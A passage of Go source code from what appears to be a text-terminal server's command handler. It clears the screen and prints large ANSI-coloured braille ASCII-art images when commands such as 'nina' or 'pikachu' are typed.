this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠘⠁⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣾⣿⣿⣿⣿⣷⣛⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠃⠄⣤⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⣰⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣟⣱⣿⡿⣿⠿⣿⣿⣿⣿⡿⡿⠿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣶⣀⠄⠄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⣿⠛⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠿⠿⣿⠛⠛⠛⢿⠛⠛⠚⠛⠛⢿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⡄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠄⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⡇⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣿⠃⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠄⠄⠄⠚⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⠇⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⡁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠛⠄⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠍⢀⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠰⠶⣿⣿⣿⣿⡟⠿⣧⣀⣀⣈⣩⣭⠶⠶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠍⢸⣷⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⣽⣿⣿⣭⣤⣶⠄⠄⠄⠚⠛⠛⣷⣶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠨⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡀⢸⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣿⣿⠄⠄⠄⠄⠄⠁⣾⣿⣷⣶⣶⣶⠉⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠇⠌⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
				continue
        }
if err != nil || cmd == "nina" || cmd == "NINA" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⢻⣭⣽⣻⣲⣶⣶⣶⣶⣾⣿⢭⣽⣛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣩⣶⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⡾⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣔⠿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢳⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡸⣟⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣡⣝⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢿⣷⠑⣻⡮⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⢶⣟⣭⣽⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣯⣭⣙⣿⠮⣿⣿⣿⣻⣨⣶⣮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣅⡿⣇⢻⣾⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⡿⢿⣿⣛⣿⣿⣭⣭⡍⣿⣿⣿⡭⣭⣭⣽⣿⢛⣻⠿⠿⣿⣿⣿⣿⣿⣿⣷⣌⢟⣇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣿⣾⣿⡟⣧⣸⣿⣙⢿⣷⢿⣿⣿⡇⣿⣿⣿⣟⣾⣟⣼⣿⢊⢯⢹⣻⡿⣿⣿⣿⢽⣼⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⡇⢻⣭⣿⣽⣌⣿⡸⡇⣿⣷⢻⣿⡟⡙⣿⣽⣿⡟⣭⡞⢸⣿⣿⣾⢙⢿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⡇⣿⣿⠷⠿⢟⣷⣿⣞⣘⣿⢾⡿⣽⣇⣾⡻⠯⠾⣿⣿⢸⣿⣿⣿⢸⣿⣿⣻⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣿⣿⣿⠃⢡⡄⣤⡄⠄⢠⣻⣿⣿⡼⢘⣿⣿⣏⡄⣠⡄⠄⢠⡌⠘⣿⣿⣿⠘⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣶⣿⣿⣿⣿⣞⣯⢷⣼⡾⣼⣿⣿⣿⣿⣿⣿⣿⣿⣧⢧⣴⡿⣼⣳⣿⣿⣿⣿⣶⠇⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣷⢻⣿⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⡟⣾⡀⢻⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⡌⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⢣⣇⣧⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⢿⣾⣿⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡃⣿⣧⡿⣿⢻⣿⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⡟⣇⣿⢸⢯⡻⢿⣿⣿⣿⣾⣿⣿⣿⣿⣷⣿⣿⣿⡿⣟⡽⡧⣿⣸⢿⢿⡿⣿⣀⣓⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣾⡹⡼⢈⢿⣾⣝⢻⢿⣿⣿⣿⣿⣿⣿⣿⡟⢫⣷⡾⡅⣧⢏⣳⣿⣾⣿⣿⣿⣿⣿⣿⣾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣾⣾⣯⣽⣴⣷⣾⣽⣟⣻⣯⣷⣾⣧⣯⣿⣷⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣫⣩⢷⡝⡻⠿⠿⠿⠿⢟⣋⠼⣏⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣻⣿⣻⣭⣾⣿⣿⣿⡿⡻⣴⣟⠬⢈⣁⠬⣷⣦⣛⢿⣿⣿⣿⣷⣭⣟⣿⣟⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⡫⣯⣴⣙⢿⣿⣷⣽⡻⣿⣿⣿⣝⠿⠟⢡⣾⣼⣧⣷⡘⢹⢷⣹⣿⣿⣿⢟⣯⣾⣿⡿⣫⣶⣿⣽⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣾⣿⣿⣭⣴⡝⢿⣿⣿⣿⣯⣿⣻⢿⡇⡾⡟⣿⣿⣝⡇⣶⡿⣟⣿⣽⣿⣿⣿⡿⠫⣶⣷⣽⣿⣷⡿⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣞⣽⣿⣿⣿⢏⣷⣮⣙⡿⣿⣿⣿⣿⣇⣳⣅⣷⣾⣛⣁⣿⣿⣿⣿⣿⢿⣋⣿⢮⡿⣿⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣾⣟⣻⣿⣶⣬⣹⣟⣛⣛⣛⣛⣛⣛⣻⣯⣡⣴⣿⣛⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
				continue
        }
if err != nil || cmd == "pikachu" || cmd == "PIKACHU" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[0;93m⣯⠉⠉⠙⢻⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣧⠄⠄⢸⣿⣶⣽⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⡍⠄⠄⠄⣼⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣷⡀⠈⣿⣿⣿⣿⣷⣝⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣷⣿⣿⣿⠇⠄⢀⣴⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣆⡸⣿⣿⣿⣿⣿⣷⣜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣯⣿⣿⣿⣿⣿⣿⡿⠄⣠⣾⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣝⣿⣿⣿⣿⣿⣿⣧⡻⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⡿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣣⣾⣿⣿⣿⡿⠿⣿⣛⣻⣽\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣷⣽⡻⣿⣿⣿⣿⣿⣾⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⣾⣿⣿⣿⣿⣿⡿⣻⣵⣾⡿⢟⣻⣯⣵⣾⣿⣿⣿⣿⢸\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⡻⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣯⣷⠿⣛⣭⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⣾\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⠁⠄⠿⠏⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⠿⠂⠄⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣦⣀⣀⣰⣿⣿⣿⣿⣟⣻⣿⣿⣿⣧⣀⣀⣠⣿⣿⣧⢿⣿⣿⣿⣿⡿⢿⣟⣻⣯⣽⣶⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠉⠉⠛⢿⣿⣿⣿⢿⣿⣿⢿⠿⣿⣿⣿⣿⣿⣿⣿⠛⠋⠙⢸⣿⣿⣽⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠄⠄⢸⣿⣿⣿⣷⣶⣾⣿⣿⣶⣷⣾⣿⣿⣿⠁⠄⠄⠄⢸⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠄⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠄⠄⣠⣜⢿⣿⣿⣿⣿⣿⡝⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣰⣝⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣫⡟⡿⣟⣫⣿⣿⣿⡿⢿⣛⣽⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣯⣷⣿⣿⣿⢺⣿⣿⢻⣯⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣧⠛⠄⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⡟⡯⣝⡏⣿⣿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⡏⣿⢿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
